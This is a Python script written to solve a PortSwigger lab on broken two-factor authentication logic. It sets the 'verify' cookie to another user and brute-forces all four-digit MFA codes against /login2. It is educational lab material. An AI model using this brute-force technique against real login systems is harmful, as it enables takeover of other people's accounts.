# This script was written to complete the lab https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic. 
#   The 2FA code of another user can be brute-force using other credentials


import requests
from bs4 import BeautifulSoup


def main():
  # step 1: log in as valid user: using burp
  # step 2: change verify cookie to other user: using burp

  # step 3: brute force 2FA until response code is 302
  DOMAIN = ""
  URL = f"https://{DOMAIN}/login2"
  USER_TO_BYPASS = ""
  SESSION_COOKIE = ""

  print("testing 2FA codes...")

  headers = {"Cookie": f"verify={USER_TO_BYPASS}; session={SESSION_COOKIE}"}
  for combination in range(0, 9999):
    if combination != 0 and combination % 100 == 0:
      print(f"{combination} of {10000}")
    params = {"mfa-code": f"{combination:04}"}
    response = requests.post(URL, headers = headers, data = params)
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find('p', attrs={"class" : "is-warning"}) == None:
      print(f"successfully broke 2FA: {combination:04}")
      return
  print("failed to break 2FA")


if __name__ == "__main__":
  main()
